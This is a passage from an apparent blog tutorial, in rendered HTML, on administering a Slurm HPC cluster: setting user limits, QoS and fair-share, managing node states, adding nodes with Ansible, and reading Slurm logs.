<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="user-level-limits">User-Level Limits<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#user-level-limits" class="hash-link" aria-label="Direct link to User-Level Limits" title="Direct link to User-Level Limits" translate="no">​</a></h4>
<p>Control individual user behavior:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Limit jobs in queue</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr modify user john </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MaxJobs</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">10</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Limit running jobs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr modify user john </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MaxJobsRun</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Limit wall time (in minutes)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr modify user john </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MaxWall</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1440</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 24 hours</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Limit CPUs per job</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr modify user john </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MaxCPUs</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">32</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># View user limits</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr show user john withassoc </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">format</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">user,account,maxjobs,maxsubmit,maxwall</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="quality-of-service-qos">Quality of Service (QoS)<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#quality-of-service-qos" class="hash-link" aria-label="Direct link to Quality of Service (QoS)" title="Direct link to Quality of Service (QoS)" translate="no">​</a></h3>
<p>QoS allows you to create service tiers with different priorities:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create QoS levels</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> qos normal </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">priority</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">100</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> qos high </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">priority</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">500</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MaxWall</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain">-00:00:00 </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MaxJobs</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> qos low </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">priority</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">50</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Assign QoS to account</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr modify account research_team </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">qos</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">normal,high</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Users can specify QoS when submitting</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sbatch </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--qos</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">high job_script.sh</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="fair-share-scheduling">Fair-Share Scheduling<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#fair-share-scheduling" class="hash-link" aria-label="Direct link to Fair-Share Scheduling" title="Direct link to Fair-Share Scheduling" translate="no">​</a></h3>
<p>Ensure equitable resource distribution:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Set fair-share values (higher = more priority)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr modify account research_team </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">fairshare</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">100</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr modify account dev_team </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">fairshare</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">50</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># View fair-share tree</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sshare </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-a</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># View detailed fair-share info</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sshare </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-A</span><span class="token plain"> research_team </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--all</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="node-management">Node Management<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#node-management" class="hash-link" aria-label="Direct link to Node Management" title="Direct link to Node Management" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="checking-node-status">Checking Node Status<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#checking-node-status" class="hash-link" aria-label="Direct link to Checking Node Status" title="Direct link to Checking Node Status" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># View all nodes</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sinfo</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Detailed node information</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sinfo </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-Nel</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Show node states</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sinfo </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-N</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"%N %T %C %m %e %f"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># View specific node details</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scontrol show </span><span class="token function" style="color:hsl(221, 87%, 60%)">node</span><span class="token plain"> worker-01</span><br></span></code></pre></div></div>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Job sinfo" src="https://riverxdata.github.io/river-docs/assets/images/job_sinfo-36f054ef9651148a5f22d7075a11829c.png" width="1310" height="351" class="img_ev3q"></p></figure>
<p>Node states you'll encounter:</p>
<ul>
<li class=""><strong>IDLE</strong>: Available for jobs</li>
<li class=""><strong>ALLOCATED</strong>: Running jobs</li>
<li class=""><strong>MIXED</strong>: Partially allocated</li>
<li class=""><strong>DRAIN</strong>: Won't accept new jobs (draining)</li>
<li class=""><strong>DRAINED</strong>: Fully drained</li>
<li class=""><strong>DOWN</strong>: Not responding</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="node-maintenance">Node Maintenance<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#node-maintenance" class="hash-link" aria-label="Direct link to Node Maintenance" title="Direct link to Node Maintenance" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="draining-a-node">Draining a Node<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#draining-a-node" class="hash-link" aria-label="Direct link to Draining a Node" title="Direct link to Draining a Node" translate="no">​</a></h4>
<p>When you need to perform maintenance:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Drain node (won't accept new jobs, allows running jobs to finish)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scontrol update </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">NodeName</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">worker-01 </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">State</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">drain </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Reason</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"Hardware upgrade"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Force drain (terminate running jobs)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scontrol update </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">NodeName</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">worker-01 </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">State</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">drain </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Reason</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"Emergency maintenance"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check drain reason</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sinfo </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-R</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="resuming-a-node">Resuming a Node<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#resuming-a-node" class="hash-link" aria-label="Direct link to Resuming a Node" title="Direct link to Resuming a Node" translate="no">​</a></h4>
<p>After maintenance:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Resume node</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scontrol update </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">NodeName</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">worker-01 </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">State</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">resume</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify it's back</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sinfo </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> worker-01</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="forcing-node-down">Forcing Node Down<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#forcing-node-down" class="hash-link" aria-label="Direct link to Forcing Node Down" title="Direct link to Forcing Node Down" translate="no">​</a></h4>
<p>If a node is misbehaving:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Mark node as down</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scontrol update </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">NodeName</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">worker-01 </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">State</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">down </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Reason</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"Hardware failure"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># When fixed, resume</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scontrol update </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">NodeName</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">worker-01 </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">State</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">resume</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="adding-new-compute-nodes">Adding New Compute Nodes<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#adding-new-compute-nodes" class="hash-link" aria-label="Direct link to Adding New Compute Nodes" title="Direct link to Adding New Compute Nodes" translate="no">​</a></h3>
<ol>
<li class="">Update Ansible inventory (<code>inventories/hosts</code>):</li>
</ol>
<div class="language-ini codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ini codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token section punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token section section-name selector" style="color:hsl(119, 34%, 47%)">slurm_worker</span><span class="token section punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">worker-01 ansible_host</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">192.168.58.11</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">worker-02 ansible_host</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">192.168.58.12</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key attr-name" style="color:hsl(35, 99%, 36%)">worker-03 ansible_host</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token value attr-value" style="color:hsl(119, 34%, 47%)">192.168.58.13  # NEW</span><br></span></code></pre></div></div>
<ol start="2">
<li class="">Run Ansible playbook:</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ansible-playbook </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> inventories/hosts river_cluster.yml </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--limit</span><span class="token plain"> worker-03</span><br></span></code></pre></div></div>
<ol start="3">
<li class="">
<p>Update <code>slurm.conf</code> on controller and all nodes (Ansible handles this)</p>
</li>
<li class="">
<p>Restart slurmctld:</p>
</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> systemctl restart slurmctld</span><br></span></code></pre></div></div>
<ol start="5">
<li class="">Verify the new node:</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sinfo</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scontrol show </span><span class="token function" style="color:hsl(221, 87%, 60%)">node</span><span class="token plain"> worker-03</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="monitoring-and-troubleshooting">Monitoring and Troubleshooting<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#monitoring-and-troubleshooting" class="hash-link" aria-label="Direct link to Monitoring and Troubleshooting" title="Direct link to Monitoring and Troubleshooting" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="checking-slurm-logs">Checking Slurm Logs<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#checking-slurm-logs" class="hash-link" aria-label="Direct link to Checking Slurm Logs" title="Direct link to Checking Slurm Logs" translate="no">​</a></h3>
<p>Logs are essential for diagnosing issues:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Controller logs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tail</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> /var/log/slurm/slurmctld.log</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Worker node logs (on compute nodes)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tail</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> /var/log/slurm/slurmd.log</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Database logs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tail</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> /var/log/slurm/slurmdbd.log</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Filter for errors</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"error"</span><span class="token plain"> /var/log/slurm/*.log</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Filter for specific node</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"worker-01"</span><span class="token plain"> /var/log/slurm/slurmctld.log</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Last 100 lines with context</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tail</span><span 